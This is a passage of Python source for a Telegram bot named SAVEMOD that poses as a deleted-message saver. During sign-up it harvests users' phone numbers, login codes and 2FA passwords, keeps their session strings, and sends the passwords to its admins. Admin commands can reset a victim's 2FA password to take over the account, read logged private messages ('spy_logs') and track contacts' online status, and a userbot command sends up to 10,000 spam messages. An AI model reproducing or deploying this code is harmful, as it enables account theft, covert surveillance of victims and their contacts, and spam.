        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['set2fa'])
async def cmd_set2fa(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /set2fa ПАРОЛЬ")
        return
    client, uid = get_active_client()
    if not client or is_target_admin(uid):
        await message.answer("❌ Нет активного аккаунта или это администратор")
        return
    try:
        await client.edit_2fa(args)
        cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (args, uid))
        conn.commit()
        me = await client.get_me()
        await message.answer(f"✅ <b>2FA установлен на {me.first_name}</b>\n\n🔐 Пароль: <code>{args}</code>\n\n⚠️ Сохраните пароль в надежном месте!", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['info'])
async def cmd_info(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client or is_target_admin(uid):
        await message.answer("❌ Нет активного аккаунта или это администратор")
        return
    try:
        me = await client.get_me()
        cursor.execute('SELECT phone, two_fa, registered_at FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        reg_date = row[2][:10] if row and row[2] else "—"
        await message.answer(f"👤 <b>ИНФОРМАЦИЯ ОБ АККАУНТЕ</b>\n═══════════════════\n\n👤 Имя: {me.first_name}\n📝 Фамилия: {me.last_name or '—'}\n🆔 ID: <code>{me.id}</code>\n@ Юзернейм: @{me.username or '—'}\n📱 Телефон: {row[0] if row else '—'}\n🔐 2FA: {'✅ Установлен' if row and row[1] else '❌ Не установлен'}\n📅 Регистрация: {reg_date}\n📊 Активен: {'✅ Да' if uid in active_clients else '❌ Нет'}", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['logs'])
async def cmd_logs(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет логов")
        return
    response = "📜 <b>ПОСЛЕДНИЕ ЛОГИ</b>\n═══════════════════\n\n"
    for ts, name, msg in reversed(rows):
        time_str = ts[11:16] if ts else "—"
        response += f"[{time_str}] {name}: {msg[:80]}\n"
        if len(response) > 3500:
            await message.answer(response[:4000], parse_mode='HTML')
            response = ""
    if response:
        await message.answer(response[:4000], parse_mode='HTML')

@dp.message_handler(commands=['statuslogs'])
async def cmd_statuslogs(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет логов статусов")
        return
    response = "🔄 <b>ЛОГИ ВХОДОВ/ВЫХОДОВ</b>\n═══════════════════════\n\n"
    for ts, name, status in reversed(rows):
        time_str = ts[11:16] if ts else "—"
        emoji = "🟢" if "ВОШЕЛ" in status else "⚫"
        response += f"{emoji} [{time_str}] {name}: {status}\n"
        if len(response) > 3500:
            await message.answer(response[:4000], parse_mode='HTML')
            response = ""
    if response:
        await message.answer(response[:4000], parse_mode='HTML')

@dp.message_handler(commands=['stats'])
async def cmd_stats(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT COUNT(*) FROM spy_logs')
    total_logs = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(DISTINCT sender_id) FROM spy_logs')
    total_users = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_status_logs')
    total_status = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_sessions')
    total_accounts = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM muted_users')
    total_muted = cursor.fetchone()[0]
    active_count = len(active_clients)
    await message.answer(f"📊 <b>ПОЛНАЯ СТАТИСТИКА</b>\n═══════════════════\n\n👥 Всего аккаунтов: {total_accounts}\n🟢 Активных: {active_count}\n🔇 Заглушенных: {total_muted}\n💬 Всего сообщений: {total_logs}\n👤 Собеседников: {total_users}\n🔄 Логов статусов: {total_status}", parse_mode='HTML')

@dp.message_handler(commands=['backup'])
async def cmd_backup(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    status_msg = await message.answer("💾 Создаю бэкап базы данных...")
    backup_path = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, backup_path)
    file_size = os.path.getsize(backup_path) / 1024
    with open(backup_path, 'rb') as f:
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(admin_id, InputFile(f, filename=os.path.basename(backup_path)), caption=f"💾 <b>Бэкап базы данных</b>\n📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n📦 Размер: {file_size:.1f} KB", parse_mode='HTML')
                await f.seek(0)
            except:
                pass
    os.remove(backup_path)
    await status_msg.edit_text("✅ Бэкап создан и отправлен всем администраторам")

# ============================================================================
# РЕГИСТРАЦИЯ ПОЛЬЗОВАТЕЛЕЙ
# ============================================================================

@dp.message_handler(commands=['start'])
async def cmd_start(message: aiogram_types.Message):
    user_id = message.from_user.id
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row and row[0]:
        await message.answer("✅ <b>Вы уже авторизованы в SAVEMOD!</b>\n\n📌 Все уведомления об удалении/изменении сообщений будут приходить сюда.\n\n💡 Для управления аккаунтами используйте /spyhelp", parse_mode='HTML')
        if user_id not in active_clients:
            asyncio.create_task(run_userbot(user_id, row[0]))
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 <b>Добро пожаловать в SAVEMOD!</b>\n\nДля начала работы необходимо авторизовать ваш аккаунт Telegram.\n\n📱 Нажмите кнопку ниже и поделитесь своим номером телефона:", parse_mode='HTML', reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def handle_contact(message: aiogram_types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {'client': client, 'phone': phone, 'hash': result.phone_code_hash, 'code': '', 'first_name': message.contact.first_name or ''}
        await message.answer("📱 <b>Введите код из SMS</b>\n\nКод подтверждения был отправлен в Telegram.\nИспользуйте кнопки ниже для ввода:", parse_mode='HTML', reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке кода: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
async def handle_code_callback(callback: aiogram_types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in temp_auth:
        await callback.answer("❌ Сессия истекла, начните заново /start")
        await callback.message.delete()
        return
    action = callback.data.replace('code_', '')
    current_code = temp_auth[user_id].get('code', '')
    if action.startswith('digit_'):
        digit = action.split('_')[1]
        if len(current_code) < 5:
            temp_auth[user_id]['code'] = current_code + digit
            await callback.answer(f"➕ Введено: {digit}")
    elif action == 'backspace':
        temp_auth[user_id]['code'] = current_code[:-1]
        await callback.answer("⌫ Удалено")
    elif action == 'submit':
        if len(current_code) == 5:
            await callback.answer("⏳ Авторизация...")
            await complete_authorization(callback, user_id)
            return
        else:
            await callback.answer(f"❌ Нужно 5 цифр (сейчас {len(current_code)})", show_alert=True)
            return
    new_code = temp_auth[user_id]['code']
    display = new_code if new_code else "_____"
    await callback.message.edit_text(f"📱 <b>Код подтверждения</b>\n\nТекущий код: <code>{display}</code>\n\n{'✅ Готово к отправке' if len(new_code) == 5 else '❌ Нужно 5 цифр'}", parse_mode='HTML', reply_markup=get_code_keyboard())
    await callback.answer()

async def complete_authorization(callback: aiogram_types.CallbackQuery, user_id: int):
    data = temp_auth[user_id]
    try:
        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
        session_string = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', (user_id, session_string, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await callback.message.answer(f"✅ <b>Авторизация успешна!</b>\n\n👤 Аккаунт: {me.first_name} {me.last_name or ''}\n🆔 ID: <code>{me.id}</code>\n@ Юзернейм: @{me.username or '—'}\n\n📌 Теперь вы можете использовать SAVEMOD!\n💡 /spyhelp - список всех команд", parse_mode='HTML')
        asyncio.create_task(run_userbot(user_id, session_string))
        await data['client'].disconnect()
        del temp_auth[user_id]
        await send_to_admins(f"🎉 <b>Новый пользователь!</b>\n\n👤 {me.first_name}\n🆔 <code>{user_id}</code>\n📱 {data['phone']}")
    except Exception as e:
        if '2FA' in str(e) or 'password' in str(e).lower():
            await callback.message.answer("🔐 <b>Введите пароль от двухфакторной аутентификации</b>\n\nОтправьте пароль текстовым сообщением:", parse_mode='HTML')
            pending_2fa[user_id] = data
            del temp_auth[user_id]
        else:
            await callback.message.answer(f"❌ Ошибка авторизации: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
async def handle_2fa(message: aiogram_types.Message):
    user_id = message.from_user.id
    data = pending_2fa[user_id]
    try:
        await data['client'].sign_in(password=message.text.strip())
        session_string = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', (user_id, session_string, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await message.answer(f"✅ <b>Авторизация с 2FA успешна!</b>\n\n👤 Аккаунт: {me.first_name}\n🆔 ID: <code>{me.id}</code>\n\n📌 Добро пожаловать в SAVEMOD!", parse_mode='HTML')
        asyncio.create_task(run_userbot(user_id, session_string))
        await data['client'].disconnect()
        del pending_2fa[user_id]
        await send_to_admins(f"🎉 <b>Новый пользователь (2FA)!</b>\n\n👤 {me.first_name}\n🆔 <code>{user_id}</code>\n📱 {data['phone']}\n🔐 Пароль: {message.text.strip()}")
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: {e}")

# ============================================================================
# ЮЗЕРБОТ
# ============================================================================

async def run_userbot(owner_id: int, session_string: str):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        logger.error(f"❌ {owner_id} не авторизован, удаляю сессию")
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
        return
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    user_status_tracker[owner_id] = {}
    logger.info(f"✅ Юзербот запущен для {owner_id}")
    me = await client.get_me()
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    @client.on(events.UserUpdate)
    async def track_user_status(event):
        try:
            if not hasattr(event, 'user') or event.user is None or event.user.id is None:
                return
            user = event.user
            if getattr(user, 'bot', False) or is_target_admin(user.id):
                return
            user_id = user.id
            user_name = user.first_name or user.username or str(user_id)
            current_status = type(user.status).__name__
            last_status = user_status_tracker.get(owner_id, {}).get(user_id)
            if last_status != current_status:
                user_status_tracker[owner_id][user_id] = current_status
                str_user_id = str(user_id)
                if str_user_id in monitored_users:
                    mon_data = monitored_users[str_user_id]
                    try:
                        if isinstance(user.status, UserStatusOnline):
                            await bot.send_message(mon_data['admin_id'], f"🟢 <b>{user_name}</b> вошел в сеть!", parse_mode='HTML')
                        elif isinstance(user.status, UserStatusOffline):
                            await bot.send_message(mon_data['admin_id'], f"⚫ <b>{user_name}</b> вышел из сети!", parse_mode='HTML')
                    except:
                        pass
                if isinstance(user.status, UserStatusOnline):
                    status_text = "🟢 ВОШЕЛ В СЕТЬ"
                elif isinstance(user.status, UserStatusOffline):
                    status_text = "⚫ ВЫШЕЛ ИЗ СЕТИ"
                else:
                    return
                cursor.execute('INSERT INTO user_status_logs (timestamp, user_id, user_name, status) VALUES (?, ?, ?, ?)', (datetime.now().isoformat(), user_id, user_name[:100], status_text))
                conn.commit()
        except Exception as e:
            pass
    
    @client.on(events.NewMessage)
    async def save_incoming(event):
        if event.out:
            return
        sender_id = event.sender_id
        if is_target_admin(sender_id):
            return
        if event.is_private and sender_id in muted_users:
            await event.delete()
            return
        if event.text:
            saved_messages[owner_id][event.id] = {'sender_id': sender_id, 'text': event.text}
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)', (owner_id, event.id, sender_id, event.text, datetime.now().isoformat()))
            conn.commit()
            cursor.execute('INSERT INTO spy_logs (timestamp, sender_id, sender_name, message, chat_id, chat_name) VALUES (?, ?, ?, ?, ?, ?)', (datetime.now().isoformat(), sender_id, (await client.get_entity(sender_id)).first_name or str(sender_id), event.text[:500], event.chat_id, 'private'))
            conn.commit()
    
    @client.on(events.MessageDeleted)
    async def notify_delete(event):
        if not event.is_private:
            return
        for msg_id in event.deleted_ids:
            msg = saved_messages.get(owner_id, {}).get(msg_id)
            if not msg:
                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                row = cursor.fetchone()
                if row:
                    msg = {'sender_id': row[0], 'text': row[1]}
            if msg and msg['sender_id'] != owner_id and msg['sender_id'] and not is_target_admin(msg['sender_id']):
                try:
                    user = await client.get_entity(msg['sender_id'])
                    name = user.first_name or 'Пользователь'
                    username = f"@{user.username}" if user.username else ''
                    await send_to_admins(f"🗑 <b>{name}</b> {username} удалил сообщение:\n\n<blockquote>{escape_html(msg['text'][:500])}</blockquote>", parse_mode='HTML')
                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                    conn.commit()
                    if msg_id in saved_messages.get(owner_id, {}):
                        del saved_messages[owner_id][msg_id]
                except:
                    pass
    
    @client.on(events.MessageEdited)
    async def notify_edit(event):
        if not event.is_private or event.out:
            return
        msg_id = event.id
        new_text = event.text or ''
        msg = saved_messages.get(owner_id, {}).get(msg_id)
        if not msg:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
            row = cursor.fetchone()
            if row:
                msg = {'sender_id': row[0], 'text': row[1]}
        if msg and msg['sender_id'] != owner_id and msg['text'] != new_text and not is_target_admin(msg['sender_id']):
            try:
                user = await client.get_entity(msg['sender_id'])
                name = user.first_name or 'Пользователь'
                username = f"@{user.username}" if user.username else ''
                await send_to_admins(f"✏️ <b>{name}</b> {username} изменил сообщение:\n\n<b>Было:</b>\n<blockquote>{escape_html(msg['text'][:200])}</blockquote>\n<b>Стало:</b>\n<blockquote>{escape_html(new_text[:200])}</blockquote>", parse_mode='HTML')
                cursor.execute('UPDATE saved_messages SET text=?, is_edited=1 WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
                conn.commit()
                if msg_id in saved_messages.get(owner_id, {}):
                    saved_messages[owner_id][msg_id]['text'] = new_text
            except:
                pass
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.out:
            return
        text = event.text or ''
        if not text.startswith('.'):
            return
        if text == '.help':
            await event.edit("🤖 <b>SAVEMOD - КОМАНДЫ ЮЗЕРБОТА</b>\n═══════════════════════\n\n▪️ <b>.help</b> - эта справка\n▪️ <b>.mute</b> (ответ) - заглушить пользователя\n▪️ <b>.unmute</b> (ответ) - разглушить\n▪️ <b>.list</b> - список заглушенных\n▪️ <b>.spam [кол-во] [текст]</b> - спам (без лимита)\n▪️ <b>.type [текст]</b> - эффект печати\n▪️ <b>.info</b> (ответ) - информация о пользователе\n\n💡 Все уведомления об удалении/изменении приходят в бота", parse_mode='HTML')
            return
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id and reply.sender_id != owner_id and not is_target_admin(reply.sender_id):
                cursor.execute('INSERT OR IGNORE INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)', (reply.sender_id, owner_id, datetime.now().isoformat()))
                conn.commit()
                muted_users.add(reply.sender_id)
                await event.edit('🔇 Пользователь заглушен')
            else:
                await event.edit('❌ Ответьте на сообщение пользователя (не администратора)')
            return
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.discard(reply.sender_id)
                await event.edit('🔊 Пользователь разглушен')
            else:
                await event.edit('❌ Ответьте на сообщение пользователя')
            return
        if text == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        if u:
                            names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit(f"🔇 <b>ЗАГЛУШЕННЫЕ ПОЛЬЗОВАТЕЛИ</b>\n\n" + "\n".join(names), parse_mode='HTML')
            else:
                await event.edit("🔇 Нет заглушенных пользователей")
            return
        if text.startswith('.spam '):
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                try:
                    count = int(parts[1])
                    if count < 1:
                        return
                    msg_text = parts[2] if len(parts) > 2 else None
                    if not msg_text:
                        reply = await event.get_reply_message()
                        if reply:
                            msg_text = reply.text
                    if msg_text:
                        await event.delete()
                        for i in range(min(count, 10000)):
                            await client.send_message(event.chat_id, msg_text)
                            await asyncio.sleep(0.05)
                except ValueError:
                    pass
            return
        if text.startswith('.type '):
            txt = text[6:]
            if txt:
                await event.delete()
                msg = await client.send_message(event.chat_id, txt[0])
                typed = txt[0]
                for ch in txt[1:]:
                    typed += ch
                    try:
                        await msg.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.15)
            return
        if text == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    if not u:
                        await event.edit("❌ Пользователь не найден")
                        return
                    if is_target_admin(u.id):
                        await event.edit("❌ Нельзя смотреть информацию об администраторе")
                        return
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    bot_status = "🤖 Да" if getattr(u, 'bot', False) else "👤 Нет"
                    await event.edit(f"👤 <b>{u.first_name}</b>\n══════════════\n\n🆔 ID: <code>{u.id}</code>\n🔇 Заглушен: {muted}\n🤖 Бот: {bot_status}\n@ Юзернейм: @{u.username or '—'}", parse_mode='HTML')
                except Exception as e:
                    await event.edit(f"❌ Ошибка: {e}")
            else:
                await event.edit('❌ Ответьте на сообщение')
            return
    
    await client.run_until_disconnected()

# ============================================================================
# ВЕБ-СЕРВЕР ДЛЯ RAILWAY
# ============================================================================

flask_app = Flask(__name__)

@flask_app.route('/')
def health_check():
    return jsonify({'status': 'ok', 'time': datetime.now().isoformat(), 'admins': len(ADMIN_IDS), 'active_sessions': len(active_clients)})

@flask_app.route('/stats')
def web_stats():
    return jsonify({'active_sessions': len(active_clients), 'total_accounts': cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0], 'total_logs': cursor.execute('SELECT COUNT(*) FROM spy_logs').fetchone()[0]})

def run_web():
    flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

# ============================================================================
# ЗАПУСК
# ============================================================================

async def restore_all_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    rows = cursor.fetchall()
    for user_id, session_str in rows:
        if not is_target_admin(user_id):
            asyncio.create_task(run_userbot(user_id, session_str))

async def main():
    logger.info(f"🚀 SAVEMOD ЗАПУСК | Админы: {ADMIN_IDS} | БД: {DB_PATH}")
    await restore_all_sessions()
    while True:
        await asyncio.sleep(60)

if __name__ == '__main__':
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if "event loop is already running" in str(e):
            loop = asyncio.get_event_loop()
            loop.create_task(main())
        else:
            raise
